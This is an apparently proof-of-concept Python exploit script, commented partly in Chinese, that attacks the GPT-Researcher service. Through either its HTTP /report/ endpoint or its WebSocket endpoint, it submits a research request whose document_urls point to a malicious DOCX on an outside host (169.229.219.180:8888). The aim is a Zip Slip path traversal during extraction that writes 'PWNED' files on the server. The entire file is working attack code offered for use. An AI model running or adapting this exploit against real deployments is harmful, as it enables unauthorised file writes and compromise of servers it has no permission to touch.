#!/usr/bin/env python3
"""
正确的GPT-Researcher Zip Slip Exploit
使用HTTP POST请求，模仿test_run.py的方式
"""

import requests
import json
import time
import sys

def exploit_via_http():
    """使用HTTP POST发送包含恶意document_urls的请求"""

    # Configuration
    host = "localhost"
    port = 8009
    malicious_url = "http://169.229.219.180:8888/malicious_document.docx"

    print("=" * 70)
    print("GPT-Researcher Zip Slip Exploit (HTTP POST Method)")
    print("=" * 70)
    print(f"\n[*] Target: http://{host}:{port}/report/")
    print(f"[*] Malicious DOCX URL: {malicious_url}")

    # 构造payload - 参考test_run.py，但添加document_urls
    payload = {
        "task": "Please analyze this important document for me",
        "report_type": "research_report",
        "report_source": "hybrid",  # hybrid会处理documents
        "tone": "Objective",
        "headers": {
            "document_urls": [malicious_url]  # 尝试在headers中
        },
        "repo_name": "",
        "branch_name": "",
        "generate_in_background": False  # 同步执行以便观察
    }

    print(f"\n[*] Payload:")
    print(json.dumps(payload, indent=2))

    url = f"http://{host}:{port}/report/"

    try:
        print(f"\n[*] Sending HTTP POST request...")
        print(f"[*] This will:")
        print(f"    1. Server downloads malicious DOCX from {malicious_url}")
        print(f"    2. Extracts it using UnstructuredWordDocumentLoader")
        print(f"    3. If vulnerable: PWNED files will be created")
        print(f"\n[*] Waiting for response (this may take a while)...\n")

        start_time = time.time()

        response = requests.post(
            url,
            json=payload,
            headers={"Content-Type": "application/json"},
            timeout=300  # 5 minutes timeout
        )

        elapsed_time = time.time() - start_time

        print(f"\n[*] Response received in {elapsed_time:.1f} seconds")
        print(f"[*] Status Code: {response.status_code}")

        if response.status_code == 200:
            result = response.json()
            print(f"\n[✓] Request successful!")
            print(f"[*] Response:")
            print(json.dumps(result, indent=2)[:500])

            if "research_id" in result:
                print(f"\n[*] Research ID: {result['research_id']}")

        else:
            print(f"\n[!] Request failed!")
            print(f"[*] Response: {response.text[:500]}")
            return False

    except requests.exceptions.ConnectionError:
        print(f"\n[✗] Connection refused!")
        print(f"[*] Is gpt-researcher running on port {port}?")
        print(f"[*] Check: docker ps | grep gpt-researcher")
        return False

    except requests.exceptions.Timeout:
        print(f"\n[!] Request timed out after 300 seconds")
        print(f"[*] Server might still be processing...")
        print(f"[*] Check container logs: docker logs gpt-researcher-gpt-researcher-1")
        return False

    except Exception as e:
        print(f"\n[✗] Error: {e}")
        import traceback
        traceback.print_exc()
        return False

    print("\n" + "=" * 70)
    print("EXPLOIT COMPLETE")
    print("=" * 70)
    print("\n[*] Next step: Verify if PWNED files exist")
    print("    Run: bash verify_vulnerability.sh")
    print("=" * 70)
    return True


def exploit_via_websocket_corrected():
    """
    备选方案：使用WebSocket，但在document_urls中传递malicious URL
    参考frontend代码中的正确格式
    """
    import asyncio
    import websockets

    async def run():
        uri = "ws://localhost:8009/ws"
        malicious_url = "http://169.229.219.180:8888/malicious_document.docx"

        print("=" * 70)
        print("GPT-Researcher Zip Slip Exploit (WebSocket Method)")
        print("=" * 70)
        print(f"\n[*] Target: {uri}")
        print(f"[*] Malicious URL: {malicious_url}")

        try:
            async with websockets.connect(uri, ping_interval=None) as ws:
                print("\n[✓] WebSocket connected")

                # 参考frontend/nextjs/hooks/useWebSocket.ts的格式
                payload = {
                    "task": "Please analyze this document",
                    "report_type": "research_report",
                    "report_source": "hybrid",
                    "source_urls": [],
                    "document_urls": [malicious_url],  # ← 关键：document_urls
                    "tone": "Objective",
                    "headers": {},
                    "query_domains": [],
                    "mcp_enabled": False,
                    "mcp_strategy": "fast",
                    "mcp_configs": []
                }

                # 注意：必须是 "start " (有空格!)
                message = "start " + json.dumps(payload)
                print(f"\n[*] Sending payload...")
                await ws.send(message)
                print("[✓] Payload sent!")

                print("\n[*] Monitoring responses...\n")

                response_count = 0
                start_time = time.time()

                while True:
                    try:
                        response = await asyncio.wait_for(ws.recv(), timeout=10.0)
                        response_count += 1

                        data = json.loads(response)
                        msg_type = data.get('type', 'unknown')

                        timestamp = time.strftime('%H:%M:%S')
                        print(f"[{timestamp}] #{response_count} Type: {msg_type}")

                        if msg_type == 'path':
                            print(f"\n[✓] Research completed!")
                            break

                        if msg_type == 'error':
                            content = data.get('content', data.get('output', ''))
                            print(f"\n[!] Error: {content}")
                            break

                    except asyncio.TimeoutError:
                        elapsed = time.time() - start_time
                        print(f"[*] Waiting... ({elapsed:.0f}s)")

                        if elapsed > 180:
                            print("\n[!] Timeout")
                            break

                    except websockets.exceptions.ConnectionClosed:
                        print("\n[!] Connection closed")
                        break

                print(f"\n[*] Total responses: {response_count}")

        except Exception as e:
            print(f"\n[✗] Error: {e}")
            import traceback
            traceback.print_exc()
            return False

        print("\n[*] Check results with: bash verify_vulnerability.sh")
        return True

    asyncio.run(run())


if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="GPT-Researcher Zip Slip Exploit")
    parser.add_argument("--method", choices=["http", "websocket"], default="websocket",
                       help="Exploit method (default: websocket)")

    args = parser.parse_args()

    print(f"\n[*] Selected method: {args.method.upper()}")
    print()

    if args.method == "http":
        success = exploit_via_http()
    else:
        success = exploit_via_websocket_corrected()

    sys.exit(0 if success else 1)
